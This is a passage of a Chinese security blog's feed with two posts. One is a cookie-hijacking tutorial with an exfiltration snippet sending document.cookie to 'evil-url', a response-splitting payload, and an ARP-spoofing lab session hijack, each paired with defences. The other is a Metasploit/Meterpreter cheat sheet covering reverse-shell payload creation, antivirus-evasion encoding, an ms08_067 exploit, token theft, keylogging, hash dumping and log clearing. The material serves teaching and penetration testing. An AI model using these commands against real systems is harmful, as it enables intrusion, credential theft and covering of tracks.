HttpOnly</span></span><br></pre></td></tr></table></figure><p>设置了这个属性的Cookie在javascript中无法获取到，只会在网络传输过程中带到服务器。</p><h3 id="5-Third-Party-Cookie"><a href="#5-Third-Party-Cookie" class="headerlink" title="5) Third-Party Cookie"></a>5) Third-Party Cookie</h3><p>第三方Cookie的使用场景通常是iframe，例如<code>www.a.com</code>嵌入了一个<code>www.ad.com</code>的广告iframe，那么<code>www.ad.com</code>设置的cookie属于不属于<code>www.a.com</code>，被称作<code>第三方Cookie</code>。</p><h3 id="6-Supercookie"><a href="#6-Supercookie" class="headerlink" title="6) Supercookie"></a>6) Supercookie</h3><p>Cookie会从属于一个域名，例如<code>www.a.com</code>，或者属于一个子域，例如<code>b.a.com</code>。但是如果Cookie被声明为属于<code>.com</code>会发生什么？这个Cookie会在任何<code>.com</code>域名生效。这有很大的安全性问题。这种Cookie被称作<code>Supercookie</code>。</p><p>浏览器做出了限制，不允许设置顶级域名Cookie(例如.com，.net)和pubic suffix cookie(例如.co.uk，.com.cn)。</p><p>现代主流浏览器都很好的处理了Supercookie问题，但是如果有些第三方浏览器使用的顶级域名和public suffix列表有问题，那么就可以针对Supercookie进行攻击。</p><h3 id="7-Zombie-Cookie-Evercookie"><a href="#7-Zombie-Cookie-Evercookie" class="headerlink" title="7) Zombie Cookie/Evercookie"></a>7) Zombie Cookie/Evercookie</h3><p>僵尸Cookie是指当用户通过浏览器的设置清除Cookie后可以自动重新创建的Cookie。原理是通过使用多重技术记录同样的内容(例如flash，silverlight)，当Cookie被删除时，从其他存储中恢复。</p><p>Evercookie是实现僵尸Cookie的主要技术手段。</p><h2 id="五、Cookie劫持"><a href="#五、Cookie劫持" class="headerlink" title="五、Cookie劫持"></a>五、Cookie劫持</h2><p>包含了一些敏感消息：用户名，电脑名，使用的浏览器和曾经访问的网站。用户不希望这些内容泄漏出去，尤其是当其中还包含有私人信息的时候。</p><p>XSS（Cross site scripting，跨站脚本）是最基本的Cookie窃取方式。当攻击者通过XSS获取到用户Cookie后，攻击者将利用Cookie通过合法手段进入用户账号，浏览大部分用户资源。下图是Cookie劫持的示意图：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-06-29_000000_post_session_hijacking.webp" alt="Cookie劫持示意图" title="Cookie劫持示意图"></p><p>另外，攻击者也能制造Cookie投毒。一般认为，Cookie在储存和传回服务器期间没有被修改过，而攻击者会在Cookie送回服务器之前对其进行修改，达到自己的目的。例如，在一个购物网站的Cookie中包含了顾客应付的款项，攻击者将该值改小，达到少付款的目的。这就是Cookie投毒。</p><h3 id="1-利用XSS漏洞获取Cookie"><a href="#1-利用XSS漏洞获取Cookie" class="headerlink" title="1) 利用XSS漏洞获取Cookie"></a>1) 利用XSS漏洞获取Cookie</h3><p><strong>攻击方法</strong></p><p>一旦站点中存在可利用的XSS漏洞，攻击者可直接利用注入的js脚本获取Cookie，进而通过异步请求把标识Session id的Cookie上报给攻击者。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">'http://evil-url?c='</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>].appendChild(img);</span><br></pre></td></tr></table></figure><p><strong>防御方法</strong></p><p>根据上面HttpOnly Cookie的介绍，一旦一个Cookie被设置为HttpOnly，js脚本就无法再获取到，而网络传输时依然会带上。也就是说依然可以依靠这个Cookie进行Session维持，但客户端js对其不可见。那么即使存在XSS漏洞也无法简单的利用其进行Session劫持攻击了。</p><p>上面说的防御方法无法利用XSS进行简单的攻击，但可以通过XSS结合其他漏洞获取Cookie。比如XSS结合phpinfo页面、HTTP Response Splitting。</p><h3 id="2-XSS结合phpinfo页面"><a href="#2-XSS结合phpinfo页面" class="headerlink" title="2) XSS结合phpinfo页面"></a>2) XSS结合phpinfo页面</h3><p><strong>攻击方法</strong></p><p>利用php开发应用会有一个phpinfo页面，这个页面会dump出请求信息，其中就包括Cookie信息。如下图所示的<code>_SERVER[&quot;HTTP_COOKIE&quot;]</code>变量。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-06-29_000100_phpinfo.webp" alt="phpinfo页面" title="phpinfo页面"></p><p>如果开发者没有关闭这个页面，就可以利用XSS漏洞向这个页面发起异步请求，获取到页面内容后parse出Cookie信息，然后上传给攻击者。</p><p>phpinfo是比较常见的一种dump请求的页面，但不限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。</p><p><strong>防御方法</strong></p><p>关闭所有phpinfo类dump request信息的页面。</p><h3 id="3-HTTP-Response-Splitting"><a href="#3-HTTP-Response-Splitting" class="headerlink" title="3) HTTP Response Splitting"></a>3) HTTP Response Splitting</h3><p><strong>攻击方法</strong></p><p>通常的XSS攻击都是把输入内容注入到response的content中，HTTP Response Splitting是一种针对header的注入。</p><p>例如，一个站点接受参数做302跳转：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.example.com/?r=http:<span class="comment">//baidu.com</span></span><br></pre></td></tr></table></figure><p>request信息为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /example.com?r=http:<span class="comment">//baidu.com\r\n</span></span><br><span class="line">HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>response为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Found\r\n</span><br><span class="line">Location: http:<span class="comment">//baidu.com\r\n</span></span><br><span class="line">Content-Type: text/html\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>这样页面就302跳转到了百度了。攻击者利用r参数可以注入header，r参数不是简单的url，而是包含\r\n的header信息：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//example.com/?r=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Ch1%3EDefaced!%3C/h1%3E%3C/html%3E</span></span><br></pre></td></tr></table></figure><p>这样，response就变成了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">302</span> Found\r\n</span><br><span class="line">Location: \r\n</span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK\r\n</span><br><span class="line">Content-Type: text/html\r\n</span><br><span class="line">X-XSS-Protection: <span class="number">0</span>\r\n</span><br><span class="line"></span><br><span class="line">&lt;html&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Defaced!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>&lt;<span class="regexp">/html&gt;</span></span><br><span class="line"><span class="regexp">Content-Type: text/</span>html\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>其中，X-XSS-Protection: 0 是关闭浏览器的XSS保护机制。</p><p><strong>防御方法</strong></p><p>针对header的内容做过滤，不能漏掉\r\n，特别是Location，host，referrer等。</p><h3 id="4-网络监听"><a href="#4-网络监听" class="headerlink" title="4) 网络监听"></a>4) 网络监听</h3><p>Cookie不仅存在于上层应用中，也会在网络请求中传送，那么通过网络监听也可以抓取到Cookie信息。只要是未使用https加密的网站都可以抓包分析，其中就包含了标识Session的Cookie。</p><p>完成网络监听需要满足一定的条件，常见的方式有：中间人攻击、ARP欺骗、DNS投毒。</p><p><strong>攻击方法</strong></p><p>这里演示使用ARP欺骗与Wireshark和Cookie Injector脚本来劫持百度网盘的Cookie。</p><p>实验环境：</p><blockquote><p>攻击者（Kali Linux）：10.10.10.128<br>攻击目标：10.10.10.129<br>默认网关：10.10.10.2<br>使用到的软件：arpspoof、Firefox（安装GreaseMonkey插件和Cookie Injector脚本）</p></blockquote><p>在Kali Linux中开启内核IP转发：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># echo 1 &gt; /proc/system/net/ipv4/ip_forward</span></span><br></pre></td></tr></table></figure><p>通过traceroute命令追踪网关地址，可以看到网关地址为<code>10.10.10.2</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># traceroute pan.baidu.com</span></span><br><span class="line">traceroute to pan.baidu.com (202.108.23.29), 30 hops max, 60 byte packets</span><br><span class="line">1   10.10.10.2 (10.10.10.2)  0.149 ms  0.098 ms  0.091 ms</span><br></pre></td></tr></table></figure><p>通过ifconfig命令查看目前网络接口名称，可以看到本机网络接口名为<code>eth0</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ifconfig</span></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0c:29:e5:1d:2d</span><br><span class="line">          inet addr:10.10.10.128  Bcast:10.10.10.255  Mask:255.255.255.0</span><br></pre></td></tr></table></figure><p>使用arpspoof毒化arp，欺骗目标主机<code>10.10.10.129</code>，目的是通过Wireshark能抓取到它的Cookie信息。arpspoof用法为<code>arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># arpspoof -i eth0 -t 10.10.10.129 10.10.10.2</span></span><br></pre></td></tr></table></figure><p>使用Wireshark监听数据，在过滤器中输入<code>http.cookie</code>，点击某个数据包，可以看到Cookie字段：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-06-29_000200_Wireshark.webp" alt="Wireshark抓取Cookie信息" title="Wireshark抓取Cookie信息"></p><p>在Cookie信息上点击右键复制它的值，在本机Firefox浏览器中打开 <a href="http://pan.baidu.com" target="_blank" rel="noopener">http://pan.baidu.com</a> ，发现需要登录，使用Alt+C调出Cookie Injector窗口，把复制的Cookie值粘贴进去。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-06-29_000300_%E5%8A%A0%E8%BD%BDCookie.webp" alt="Firefox中粘贴从Wireshark抓取的Cookie值" title="Firefox中粘贴从Wireshark抓取的Cookie值"></p><p>刷新页面后，发现已经进入了<code>10.10.10.129</code>主机用户的百度网盘，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-06-29_000400_%E6%88%90%E5%8A%9F%E7%99%BB%E9%99%86.webp" alt="利用Cookie登录他人百度网盘" title="利用Cookie登录他人百度网盘"></p><p><strong>防御方法</strong></p><p>网站使用Https协议。</p><p>防御网络监听通常有两种方式：信道加密和内容加密。网站开启Https连接属于信道加密，使用https协议的请求都被SSL加密，理论上不可破解，即便被网络监听也无法通过解密看到实际的内容。</p><p>但是，如果网站同时支持http和https，那么还是可以使用网络监听http请求获取Cookie。如果网站只支持Https，当用户直接输入example.com（大部分用户不会手动输入协议前缀），Web服务器通常的处理是返回301要求浏览器重定向到<a href="https://www.example.com。**因为这次301请求是http的，而且带了Cookie，因此又将Cookie明文暴露在了网络上。" target="_blank" rel="noopener">https://www.example.com。**因为这次301请求是http的，而且带了Cookie，因此又将Cookie明文暴露在了网络上。</a>**</p><p>针对这个问题，有两个防御思路：</p><ol><li>把标识Session的Cookie设置成<code>Secure</code>。上面提到的Secure Cookie，只允许在https上加密传输，在http请求中不会存在，这样就不会暴露在未加密的网络上了。</li><li>设置<code>Strict-Transport-Security header</code>，直接省略这个http请求！用户首次访问后，服务器设置了这个header以后，后面就会省略掉这次http 301请求。</li></ol><h2 id="六、参考文档"><a href="#六、参考文档" class="headerlink" title="六、参考文档"></a>六、参考文档</h2><ol><li><a href="https://zh.wikipedia.org/wiki/Cookie" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Cookie</a></li><li><a href="http://shaoshuai.me/tech/2014/08/16/cookie-theft-and-session-hijacking.html" target="_blank" rel="noopener">http://shaoshuai.me/tech/2014/08/16/cookie-theft-and-session-hijacking.html</a></li><li><a href="https://www.91ri.org/3767.html" target="_blank" rel="noopener">https://www.91ri.org/3767.html</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、Cookie简介&quot;&gt;&lt;a href=&quot;#一、Cookie简介&quot; class=&quot;headerlink&quot; title=&quot;一、Cookie简介&quot;&gt;&lt;/a&gt;一、Cookie简介&lt;/h2&gt;&lt;h3 id=&quot;1-定义&quot;&gt;&lt;a href=&quot;#1-定义&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="MITM" scheme="https://g2ex.top/tags/MITM/"/>
    
      <category term="Cookie" scheme="https://g2ex.top/tags/Cookie/"/>
    
      <category term="Injection" scheme="https://g2ex.top/tags/Injection/"/>
    
  </entry>
  
  <entry>
    <title>MSF命令参考</title>
    <link href="https://g2ex.top/2015/06/09/MSF-Cheat-Sheet/"/>
    <id>https://g2ex.top/2015/06/09/MSF-Cheat-Sheet/</id>
    <published>2015-06-09T09:50:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>以下是Metasploit框架的各种接口与程序中最常使用的命令和语法参考，以及Meterpreter后渗透测试阶段的命令参考，里边的一些“多合一”命令将会大大简化攻击步骤。</p><h2 id="一、MSF终端命令"><a href="#一、MSF终端命令" class="headerlink" title="一、MSF终端命令"></a>一、MSF终端命令</h2><p><code>show exploits</code><br>Show all exploits within the Framework.<br>列出Metasploit框架中的所有渗透攻击模块。</p><p><code>show payloads</code><br>Show all payloads within the Framework.<br>列出Metasploit框架中所有的攻击载荷。</p><p><code>show auxiliary</code><br>Show all auxiliary modules within the Framework.<br>列出Metasploit框架中的所有辅助攻击模块。</p><p><code>search name</code><br>Search for exploits or modules within the Framework.<br>查找Metasploit框架中所有的渗透攻击和其他模块。</p><p><code>info</code><br>Load information about a specific exploit or module.<br>展示出指定渗透攻击或模块的相关信息。</p><p><code>use name</code><br>Load an exploit or module (example: use windows/smb/psexec).<br>装载一个渗透攻击或者模块（例如：使用windows/smb.psexec）。</p><p><code>LHOST</code><br>Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.<br>你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要一个公共的IP地址，特别为反弹式shell使用。</p><p><code>RHOST</code><br>The remote host or the target.<br>远程主机或是目标主机。</p><p><code>set function</code><br>Set a specific value (for example,  LHOST or  RHOST ).<br>设置特定的配置参数（例如：设置本地或远程主机参数）。</p><p><code>setg function</code><br>Set a specific value globally (for example,  LHOST or  RHOST ).<br>以全局方式设置特定的配置参数（例如：设置本地或远程主机参数）。</p><p><code>show options</code><br>Show the options available for a module or exploit.<br>列出某个渗透攻击或模块中所有的配置参数。</p><p><code>show targets</code><br>Show the platforms supported by the exploit.<br>列出渗透攻击所支持的目标平台。</p><p><code>set target num</code><br>Specify a specific target index if you know the OS and service pack.<br>指定你所知道的目标的操作系统以及补丁版本类型。</p><p><code>set payload payload</code><br>Specify the payload to use.<br>指定想要使用的攻击载荷。</p><p><code>show advanced</code><br>Show advanced options.<br>列出所有高级配置选项。</p><p><code>set autorunscript migrate -f</code><br>Automatically migrate to a separate process upon exploit completion.<br>在渗透攻击完成后，将自动迁移到另一个进程。</p><p><code>check</code><br>Determine whether a target is vulnerable to an attack.<br>检测目标是否对选定渗透攻击存在相应安全漏洞。</p><p><code>exploit</code><br>Execute the module or exploit and attack the target.<br>执行渗透攻击或模块来攻击目标。</p><p><code>exploit -j</code><br>Run the exploit under the context of the job. (This will run the exploit in the background.)<br>在计划任务下进行渗透攻击（攻击将在后台进行）。</p><p><code>exploit -z</code><br>Do not interact with the session after successful exploitation.<br>渗透攻击成功后不与会话进行交互。</p><p><code>exploit -e encoder</code><br>Specify the payload encoder to use (example:  exploit –e shikata_ga_nai ).<br>制定使用的攻击载荷编码方式（例如：exploit -e shikata_ga_nai）。</p><p><code>exploit -h</code><br>Display help for the  exploit command.<br>列出exploit命令的帮助信息。</p><p><code>sessions -l</code><br>List available sessions (used when handling multiple shells).<br>列出可用的交互会话（在处理多个shell时使用）。</p><p><code>sessions -l -v</code><br>List all available sessions and show verbose fields, such as which vulnera-bility was used when exploiting the system.<br>列出所有可用的交互会话以及会话详细信息，例如：攻击系统时使用了哪个安全漏洞。</p><p><code>sessions -s script</code><br>Run a specific Meterpreter script on all Meterpreter live sessions.<br>在所有活跃的Meterpreter会话中运行一个特定的Meterpreter脚本。</p><p><code>sessions -K</code><br>Kill all live sessions.<br>杀死所有活跃的交互会话。</p><p><code>sessions -c cmd</code><br>Execute a command on all live Meterpreter sessions.<br>在所有活跃的Meterpreter会话上执行一个命令。</p><p><code>sessions -u sessionID</code><br>Upgrade a normal Win32 shell to a Meterpreter console.<br>升级一个普通的Win32 shell到Meterpreter shell。</p><p><code>db_create name</code><br>Create a database to use with database-driven attacks (example:  db_create autopwn).<br>创建一个数据库驱动攻击所要使用的数据库（例如：db_create autopwn）。</p><p><code>db_connect name</code><br>Create and connect to a database for driven attacks (example:  db_connect autopwn).<br>创建并连接一个数据库驱动攻击所要使用的数据库（例如：db_conect autopwn）。</p><p><code>db_nmap</code><br>Use nmap and place results in database. (Normal nmap syntax is supported, such as  –sT –v –P0.)<br>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语法，例如：-sT -v -P0）。</p><p><code>db_autopwn -h</code><br>Display help for using  db_autopwn .<br>展示出db_autopwn命令的帮助信息。</p><p><code>db_autopwn -p -r -e</code><br>Run  db_autopwn against all ports found, use a reverse shell, and exploit all systems.<br>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。</p><p><code>db_destroy</code><br>Delete the current database.<br>删除当前数据库。</p><p><code>db_destroy user:password@host:port/database</code><br>Delete database using advanced options.<br>使用高级选项来删除数据库。</p><h2 id="二、Meterpreter命令"><a href="#二、Meterpreter命令" class="headerlink" title="二、Meterpreter命令"></a>二、Meterpreter命令</h2><p><code>help</code><br>Open Meterpreter usage help.<br>打开Meterpreter使用帮助。</p><p><code>run scriptname</code><br>Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.<br>运行Meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。</p><p><code>sysinfo</code><br>Show the system information on the compromised target.<br>列出受控主机的系统信息。</p><p><code>ls</code><br>List the files and folders on the target.<br>列出目标主机的文件和文件夹信息。</p><p><code>use priv</code><br>Load the privilege extension for extended Meterpreter libraries.<br>加载特权提升扩展模块，来扩展Meterpreter库。</p><p><code>ps</code><br>Show all running processes and which accounts are associated with each process.<br>显示所有运行进程以及关联的用户账户。</p><p><code>migrate PID</code><br>Migrate to the specific process ID (PID is the target process ID gained from the  ps command).<br>迁移到一个指定的进程ID（PID号可通过ps命令从目标主机上获得）。</p><p><code>use incognito</code><br>Load incognito functions. (Used for token stealing and impersonation on a target machine.)<br>加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户）。</p><p><code>list_tokens -u</code><br>List available tokens on the target by user.<br>列出目标主机用户的可用令牌。</p><p><code>list_tokens -g</code><br>List available tokens on the target by group.<br>列出目标主机用户组的可用令牌。</p><p><code>impersonate_token DOMAIN_NAME\\USERNAME</code><br>Impersonate a token available on the target.<br>假冒目标主机上的可用令牌。</p><p><code>steal_token PID</code><br>Steal the tokens available for a given process and impersonate that token.<br>盗窃给定进行的可用令牌并进行令牌假冒。</p><p><code>drop_token</code><br>Stop impersonating the current token.<br>停止假冒当前令牌。</p><p><code>getsystem</code><br>Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.<br>通过各种攻击向量来提升到系统用户权限。</p><p><code>shell</code><br>Drop into an interactive shell with all available tokens.<br>以所有可用令牌来运行一个交互的Shell。</p><p><code>execute -f cmd.exe -i</code><br>Execute cmd.exe and interact with it.<br>执行cmd.exe命令并进行交互。</p><p><code>execute -f cmd.exe -i -t</code><br>Execute cmd.exe with all available tokens.<br>以所有可用令牌来执行cmd命令。</p><p><code>execute -f cmd.exe -i -H -t</code><br>Execute cmd.exe with all available tokens and make it a hidden process.<br>以所有可用令牌来执行cmd命令并隐藏该进程。</p><p><code>rev2self</code><br>Revert back to the original user you used to compromise the target.<br>回到控制目标主机的初始用户账户下。</p><p><code>reg command</code><br>Interact, create, delete, query, set, and much more in the target’s registry.<br>在目标主机注册表中进行交互，创建，删除，查询等操作。</p><p><code>setdesktop number</code><br>Switch to a different screen based on who is logged in.<br>切换到另一个用户界面（该功能基于哪些用户已登录）。</p><p><code>screenshot</code><br>Take a screenshot of the target’s screen.<br>对目标主机的屏幕进行截图。</p><p><code>upload file</code><br>Upload a file to the target.<br>向目标主机上传文件。</p><p><code>download file</code><br>Download a file from the target.<br>从目标主机下载文件。</p><p><code>keyscan_start</code><br>Start sniffing keystrokes on the remote target.<br>针对远程目标主机开启键盘记录功能。</p><p><code>keyscan_dump</code><br>Dump the remote keys captured on the target.<br>存储目标主机上捕获的键盘记录。</p><p><code>keyscan_stop</code><br>Stop sniffing keystrokes on the remote target.<br>停止针对目标主机的键盘记录。</p><p><code>getprivs</code><br>Get as many privileges as possible on the target.<br>尽可能多的获取目标主机上的特权。</p><p><code>uictl enable keyboard/mouse</code><br>Take control of the keyboard and/or mouse.<br>接管目标主机的键盘和鼠标。</p><p><code>background</code><br>Run your current Meterpreter shell in the background.<br>将你当前的Meterpreter shell转为后台执行。</p><p><code>hashdump</code><br>Dump all hashes on the target.<br>导出目标主机中的口令哈希值。</p><p><code>use sniffer</code><br>Load the sniffer module.<br>加载嗅探模块。</p><p><code>sniffer_interfaces</code><br>List the available interfaces on the target.<br>列出目标主机所有开放的网络接口。</p><p><code>sniffer_dump interfaceID pcapname</code><br>Start sniffing on the remote target.<br>在目标主机上启动嗅探。</p><p><code>sniffer_start interfaceID packet-buffer</code><br>Start sniffing with a specific range for a packet buffer.<br>在目标主机上针对特定范围的数据包缓冲区启动嗅探。</p><p><code>sniffer_stats interfaceID</code><br>Grab statistical information from the interface you are sniffing.<br>获取正在实施嗅探网络接口的统计数据。</p><p><code>sniffer_stop interfaceID</code><br>Stop the sniffer.<br>停止嗅探。</p><p><code>add_user username password -h ip</code><br>Add a user on the remote target.<br>在远程目标主机上添加一个用户。</p><p><code>add_group_user &quot;Domain Admins&quot; username -h ip</code><br>Add a username to the Domain Administrators group on the remote target.<br>将用户添加到目标主机的域管理员组中。</p><p><code>clearev</code><br>Clear the event log on the target machine.<br>清除目标主机上的日志记录。</p><p><code>timestomp</code><br>Change file attributes, such as creation date (antiforensics measure).<br>修改文件属性，例如修改文件的创建时间（反取证调查）。</p><p><code>reboot</code><br>Reboot the target machine.<br>重启目标主机。</p><h2 id="三、MSFpyaload命令"><a href="#三、MSFpyaload命令" class="headerlink" title="三、MSFpyaload命令"></a>三、MSFpyaload命令</h2><p><code>msfpayload -h</code><br>List available payloads.<br>MSFpayload的帮助信息。</p><p><code>msfpayload windows/meterpreter/bind_tcp O</code><br>List available options for the  windows/meterpreter/bind_tcp payload (all of these can use any payload).<br>列出所有windows/meterpreter/bind_tcp下攻击载荷的配置项（任何攻击载荷都是可以配置的）。</p><p><code>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X &gt; payload.exe</code><br>Create a Meterpreter reverse_tcp payload to connect back to 192.168.1.5 and on port 443, and then save it as a Windows Portable Executable named payload.exe.<br>创建一个Meterpreter的reverse_tcp攻击载荷，回连到192.168.1.5的443端口，将其保存为名为payload.exe的Windows可执行程序。</p><p><code>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R &gt; payload.raw</code><br>Same as above, but export as raw format. This will be used later in msfencode.<br>与上面生成同样的攻击载荷，但导出成原始格式的文件，该文件将在后面的MSFencode中使用。</p><p><code>msfpayload windows/meterpreter/bind_tcp LPORT=443 C &gt; payload.c</code><br>Same as above but export as C-formatted shellcode.<br>与上面生成同样的攻击载荷，但导出成C格式的shellcode。</p><p><code>msfpayload windows/meterpreter/bind_tcp LPORT=443 J &gt; payload.java</code><br>Export as %u encoded JavaScript.<br>导出成以%u编码方式的JavaScript语言字符串。</p><h2 id="四、MSFencode命令"><a href="#四、MSFencode命令" class="headerlink" title="四、MSFencode命令"></a>四、MSFencode命令</h2><p><code>msfencode -h</code><br>Display the msfencode help.<br>列出MSFencode的帮助信息。</p><p><code>msfencode -l</code><br>List the available encoders.<br>列出所有可用的编码器。</p><p><code>msfencode -t (c, elf, exe, java, js_le, js_be, perl, raw, ruby, vba, vbs, loop-vbs, asp, war, macho)</code><br>Format to display the encoded buffer.<br>显示编码器缓冲区的格式。</p><p><code>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe</code><br>Encode payload.raw with shikata_ga_nai five times and export it to an output file named encoded_payload.exe.<br>使用shikata_ga_nai编码器对payload.raw文件进行5次编码，然后导出一个名为encoded_payload.exe的文件。</p><p><code>msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -e x86/ _countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe</code><br>Create a multi-encoded payload.<br>创建一个经过多重编码格式签到编码的攻击载荷。</p><p><code>msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c</code><br>Create pure alphanumeric shellcode where ESI points to the shellcode; output in C-style notation.<br>创建一个纯字母数字的shellcode，由ESI寄存器执行shellcode，以C语言格式输出。</p><h2 id="五、MSFcli命令"><a href="#五、MSFcli命令" class="headerlink" title="五、MSFcli命令"></a>五、MSFcli命令</h2><p><code>msfcli | grep exploit</code><br>Show only exploits.<br>仅列出渗透攻击模块。</p><p><code>msfcli | grep exploit/windows</code><br>Show only Windows exploits.<br>仅列出与Windows相关的渗透攻击模块。</p><p><code>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.142 E</code><br>Launch  ms08_067_netapi exploit at 172.16.32.142 with a bind_tcp payload being delivered to listen on port 443.<br>对172.16.32.142发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在443端口进行监听。</p><h2 id="六、Metasploit高级忍术"><a href="#六、Metasploit高级忍术" class="headerlink" title="六、Metasploit高级忍术"></a>六、Metasploit高级忍术</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe</span><br></pre></td></tr></table></figure><p>创建一个反弹式的Meterpreter攻击载荷，回连到192.168.1.5主机的443端口，使用calc.exe作为载荷后门程序，让载荷执行流一直运行在被攻击的应用程序中，最后生成以.shikata_ga_nai编码器编码后的攻击载荷可执行程序paylaod.exe</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R | msfencode -x calc.exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe</span><br></pre></td></tr></table></figure><p>创建一个反弹式的Meterpreter攻击载荷，回连到192.168.1.5主机的443端口，使用calc.exe作为载荷后门程序，不让载荷执行流一直运行在被攻击的应用程序中，同时在攻击载荷执行后也不会在目标主机上弹出任何信息。这种配置非常有用，当你通过浏览器漏洞控制了远程主机，并不想让计算器程序打开呈现在目标用户前面。同样，最后生成用.shikata_ga_nai编码的攻击载荷程序payload.exe。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe &amp;&amp; msfcli multi/handler PAYLOAD=windows/ meterpreter/bind_tcp LPORT=443 E</span><br></pre></td></tr></table></figure><p>创建一个raw格式bind_tcp模式Meterpreter攻击载荷，用shikata_ga_nai编码7次，输出一payload.exe命名的Windows可执行程序文件，同时启用多路监听方式进行执行。</p><h2 id="七、MSFvenom"><a href="#七、MSFvenom" class="headerlink" title="七、MSFvenom"></a>七、MSFvenom</h2><p>利用MSFvenom，一个集成套件，来创建和编码你的攻击载荷。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --payload</span><br><span 